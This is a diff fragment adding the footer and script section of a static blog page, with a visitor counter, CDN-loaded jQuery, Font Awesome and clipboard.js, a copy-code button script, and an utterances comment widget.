+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'jackieya/jackieya.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
